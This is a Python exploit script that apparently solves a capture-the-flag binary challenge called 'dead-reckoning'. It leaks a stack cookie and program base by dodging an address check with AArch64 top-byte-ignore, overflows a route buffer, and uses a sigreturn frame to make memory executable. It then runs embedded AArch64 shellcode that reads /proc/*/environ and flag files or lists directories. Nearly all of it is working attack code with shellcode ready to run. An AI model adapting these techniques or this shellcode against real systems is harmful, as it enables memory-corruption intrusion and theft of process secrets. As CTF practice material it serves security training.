#!/usr/bin/env python3
import re
import os
import socket
import ssl
import struct
import sys
import time


HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("HOST", "dead-reckoning-4737af39fa0a.chals.z0d1ak.org")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("PORT", "1337"))


def p64(x):
    return struct.pack(">Q", x & ((1 << 64) - 1))


def p32(x):
    return struct.pack(">I", x & 0xFFFFFFFF)


def qword(bs):
    return int.from_bytes(bs.ljust(8, b"\0"), "big")


class Tube:
    def __init__(self, host, port):
        raw = socket.create_connection((host, port), timeout=10)
        self.s = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
        self.s.settimeout(8)

    def recv_until(self, token):
        data = b""
        while token not in data:
            chunk = self.s.recv(4096)
            if not chunk:
                break
            data += chunk
        return data

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.s.sendall(data + b"\n")

    def send(self, data):
        self.s.sendall(data)

    def recvall(self, timeout=6):
        self.s.settimeout(timeout)
        data = b""
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except Exception:
            pass
        return data


def repair(io, addr, value):
    io.sendline("1")
    io.recv_until(b"destination: ")
    io.sendline(hex(addr))
    io.recv_until(b"eight-byte patch: ")
    io.sendline(hex(value))
    return io.recv_until(b"> ")


def leak(io):
    banner = io.recv_until(b"> ")
    match = re.search(rb"salvage arena : (0x[0-9a-fA-F]+)", banner)
    if not match:
        raise RuntimeError(f"did not receive challenge banner; got {banner[:120]!r}")
    arena = int(match.group(1), 16)

    # Bypass the protected navigation-control range using AArch64 top-byte-ignore.
    repair(io, (0xFF << 56) | (arena + 0x18D0), 0xD8)

    io.sendline("2")
    out = io.recv_until(b"> ")
    leak_hex = re.search(rb"survey: ([0-9a-f]+)", out).group(1)
    data = bytes.fromhex(leak_hex.decode())[:0xD8]
    cookie = int.from_bytes(data[0xC0:0xC8], "big")
    pie = int.from_bytes(data[0xC8:0xD0], "big") - 0x2E0
    return arena, cookie, pie


def write_bytes(io, addr, data):
    for off in range(0, len(data), 8):
        repair(io, addr + off, qword(data[off:off + 8]))


def sigreturn_frame(regs, sp, pc):
    frame = bytearray(0x468)
    for reg, value in regs.items():
        frame[0x138 + 8 * reg:0x140 + 8 * reg] = p64(value)
    frame[0x230:0x238] = p64(sp)
    frame[0x238:0x240] = p64(pc)
    # Big-endian AArch64 sigcontext FPSIMD context header.
    frame[0x250:0x258] = p32(0x46508001) + p32(0x210)
    return bytes(frame)


def trigger_srop(io, cookie, pie, frame):
    payload = b"A" * 0xC0 + p64(cookie) + p64(0) + p64(pie + 0x818)
    payload = payload.ljust(0x100, b"B") + frame
    io.sendline("3")
    io.recv_until(b"route length: ")
    io.sendline(str(len(payload)))
    io.recv_until(b"route bytes: ")
    io.send(payload)


def run_shellcode(path, mode="read"):
    io = Tube(HOST, PORT)
    arena, cookie, pie = leak(io)
    print(f"[+] arena={arena:#x} cookie={cookie:#x} pie={pie:#x}", file=sys.stderr)

    path_addr = arena + 0x300
    code_addr = arena + 0x400
    buf_addr = arena + 0x800
    write_bytes(io, path_addr, path.encode() + b"\0")

    if mode == "getdents":
        # openat(AT_FDCWD, path, 0, 0); getdents64(fd, buf, 0x400); write(1, buf, 0x400); exit(0)
        shellcode = bytes.fromhex(
            "600c8092e10314aa020080d2030080d2080780d2010000d4"
            "f30300aae00313aae10315aa028080d2a80780d2010000d4"
            "200080d2e10315aa028080d2080880d2010000d4"
            "000080d2a80b80d2010000d4"
        )
    else:
        # openat(AT_FDCWD, path, 0, 0); read(fd, buf, 0x100); write(1, buf, 0x100); exit(0)
        shellcode = bytes.fromhex(
            "600c8092e10314aa020080d2030080d2080780d2010000d4"
            "f30300aae00313aae10315aa022080d2e80780d2010000d4"
            "200080d2e10315aa022080d2080880d2010000d4"
            "000080d2a80b80d2010000d4"
        )

    write_bytes(io, code_addr, shellcode)

    frame = sigreturn_frame(
        {
            0: arena,
            1: 0x2000,
            2: 7,
            8: 226,  # mprotect
            20: path_addr,
            21: buf_addr,
            30: code_addr,
        },
        arena + 0x1000,
        pie + 0x824,
    )
    trigger_srop(io, cookie, pie, frame)
    return io.recvall()


def parse_dirents(blob):
    pos = 0
    names = []
    while pos + 19 <= len(blob):
        reclen = int.from_bytes(blob[pos + 16:pos + 18], "big")
        if reclen <= 0 or pos + reclen > len(blob):
            break
        name = blob[pos + 19:pos + reclen].split(b"\0", 1)[0]
        if name:
            names.append(name.decode("latin1", "replace"))
        pos += reclen
    return names


def main():
    candidates = [
        "/proc/1/environ",
        "/proc/self/environ",
        "/flag",
        "/flag.txt",
        "/server/flag",
        "/server/flag.txt",
        "/server/flags/flag.txt",
    ]
    for path in candidates:
        try:
            out = run_shellcode(path, "read")
        except Exception as exc:
            print(f"[-] {path}: {exc}", file=sys.stderr)
            time.sleep(1)
            continue
        clean = out.replace(b"\0", b"")
        print(f"[+] tried {path}: {clean[:200]!r}", file=sys.stderr)
        match = re.search(rb"[A-Za-z0-9_]+CTF\{[^}\r\n\x00]+\}|[A-Za-z0-9_]+\{[^}\r\n\x00]+\}", out)
        if match:
            print(match.group(0).decode())
            return

    for path in ["/", "/server", "/app", "/tmp"]:
        try:
            out = run_shellcode(path, "getdents")
            print(f"[+] {path}: {parse_dirents(out)}", file=sys.stderr)
        except Exception as exc:
            print(f"[-] list {path}: {exc}", file=sys.stderr)


if __name__ == "__main__":
    main()
